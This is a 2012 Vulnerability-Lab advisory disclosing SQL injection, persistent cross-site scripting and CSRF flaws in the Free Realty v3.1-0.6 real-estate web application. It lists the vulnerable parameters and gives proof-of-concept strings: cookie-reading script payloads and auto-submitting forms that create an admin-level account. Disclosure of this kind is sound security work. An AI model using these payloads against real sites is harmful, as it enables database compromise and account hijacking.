@@ -1,0 +1,191 @@
+Title:
+======
+Free Reality v3.1-0.6 - Multiple Web Vulnerabilities
+
+
+Date:
+=====
+2012-05-07
+
+
+References:
+===========
+http://www.vulnerability-lab.com/get_content.php?id=513
+
+
+VL-ID:
+=====
+513
+
+
+Common Vulnerability Scoring System:
+====================================
+7.5
+
+
+Introduction:
+=============
+Free Realty is primarily designed for real estate agents and offices to list properties on the internet. With Free Realty the end 
+user does not need to be fluent in web page design. Read more in the demo site
+This is a fork of 
+software written by Jon Roig called Open Realty. Jon has moved on to version 3.0 while a number of users have requested 
+continued development on the 2.x series. Other sites of note regarding 2.x development 
+www.1axn.com/gi-bin/openforum/ikonboard.cgi the original discussion board, before Jon opened up his own. 
+
+(Copy of the Vendor Homepage:  http://freerealty.rwcinc.net  )
+
+
+Abstract:
+=========
+A Vulnerability Laboratory Researcher Team discovered multiple Web Vulnerabilities in the Free Reality v3.1-0.6 web application.
+
+
+Report-Timeline:
+================
+2012-05-07:  Public or Non-Public Disclosure
+
+
+Status:
+========
+Published
+
+
+Exploitation-Technique:
+=======================
+Remote
+
+
+Severity:
+=========
+Critical
+
+
+Details:
+========
+1.1
+A remote SQL Injection vulnerability is detected in the Free Reality v3.1-0.6 web application. 
+The vulnerability allows an attacker (remote) or local low privileged user account to inject/execute own sql commands on 
+the affected application dbms. Successful exploitation of the vulnerability results in dbms & application compromise.
+
+Vulnerable Module(s):
+          [+] agentdisplay.php?view=
+          [+] /admin/admin.php?edit=
+
+1.2
+Multiple persistent input validation vulnerabilities are detected in the Free Reality v3.1-0.6 web application.
+The bugs allow remote attackers to implement/inject malicious script code on the application side (persistent). 
+Successful exploitation of the vulnerability can lead to session hijacking (manager/admin) or stable (persistent) context manipulation. 
+Exploitation requires low user inter action.
+                                       
+Vulnerable Module(s):
+          [+] admin/agenteditor.php - inject  notes about the Agent
+          [+] agentadmin.php?edit=2 - inject title / preview description: / Long description: / notes
+          [+] agentadmin.php?action=addlisting inject title / preview description: / Long description: / notes
+          [+] admin/adminfeatures.php - Add new feature
+
+
+1.3
+A cross site request forgery vulnerability is detected in  in the Free Reality v3.1-0.6 web application. The bugs allow remote 
+attackers with high required user inter action to edit user accounts. Successful exploitation can lead to account access.
+To exploit the issue the attacker need to create a manipulated copy the edit user mask/form. Inside of the document the 
+remote can implement his own values for the update because of no form or token protection. When admin get now forced to 
+execute the script via link he is executing the new value on the update of the application if his session is not expired.
+
+Vulnerable Module(s):
+          [+] admin/agenteditor.php?action=addagent - Add agent
+          [+] admin/agenteditor.php?adminmodify=2 - Modify Agent
+
+
+Proof of Concept:
+=================
+1.1
+The sql injection vulnerability can be exploited by remote attackers without user inter action. For demonstration or reproduce ...
+
+PoC:
+http://127.0.0.1/FR/agentdisplay.php?view=1[SQL-INJECTION!]
+http://127.0.0.1/FR/admin/admin.php?edit=2[SQL-INJECTION!]
+
+1.2
+The persistent input validation vulnerability can be exploited by remote attackers with medium till low required user inter action. 
+For demonstration or reproduce ...
+
+Note:
+The issue can be exploited by an insert on the Created Object function with script code as value.
+The result is the persistent execution out of the web application context. 
+
+Strings: 
+>"<<iframe src=http://vulnerability-lab.com/>37</iframe> ... or 
+>"<script>alert(document.cookie)</script><div style="1
+
+1.3
+The csrf vulnerability can be exploited by remote attackers with high required user inter action. For demonstration or reproduce ...
+
+<html>
+<form  name="test" action="http://127.0.0.1/FR/admin/agenteditor.php?adminmodify=2" method="post">
+<input type="hidden" name="agent" value="test2"><br/>
+<input type="hidden" name="agenttitle" value="test3"><br/>
+<input type="hidden" name="agentpass" value="storm"><br/>
+</form>
+<script>document.test.submit();</script>
+</html>
+
+<html>
+<form  name="addagent" action="http://127.0.1.1/FR/admin/agenteditor.php?action=addagent" method="post">
+<input type="hidden" name="agent" value="test3"><br/>
+<input type="hidden" name="agenttitle" value="test3"><br/>
+<input type="hidden" name="agentpass" value="test3"><br/>
+<input type="hidden" name="agentfax" value="test3"><br/>
+<input type="hidden" name="agentcell" value="test3"><br/>
+<input type="hidden" name="agentphone" value="test3"><br/>
+<input type="hidden" name="agenturl" value="test3"><br/>
+<input type="hidden" name="agentemail=" value="test3@hotmail.com"><br/>
+<input type="hidden" name="user_level" value="admin"><br/>
+<input type="hidden" name="notes" value="TEST#"><br/>
+</form>
+<script>document.addagent.submit();</script>
+</html>
+
+
+Risk:
+=====
+1.1
+The security risk of the remote SQL injection vulnerability is estimated as critical.
+
+1.2
+The security risk of the persistent input validation vulnerability is estimated as medium.
+
+1.3 
+The security risk of the cross site request forgery vulnerability is estimated as low(+).
+
+
+Credits:
+========
+Vulnerability Laboratory [Research Team]   -    the_storm (storm@vulnerability-lab.com)
+
+
+Disclaimer:
+===========
+The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
+either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
+Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
+profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
+states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
+may not apply.
+
+Domains:  www.vulnerability-lab.com   - www.vuln-lab.com
+Section:  video.vulnerability-lab.com - forum.vulnerability-lab.com - news.vulnerability-lab.com
+Contact:  admin@vulnerability-lab.com - support@vulnerability-lab.com - irc.vulnerability-lab.com
+
+Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. 
+Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
+other media, are reserved by Vulnerability-Lab Research Team or its suppliers.
+
+                Copyright © 2012 Vulnerability-Lab
+
+
+
+
+-- 
+VULNERABILITY RESEARCH LABORATORY TEAM
+Website: www.vulnerability-lab.com
+Mail: research@vulnerability-lab.com
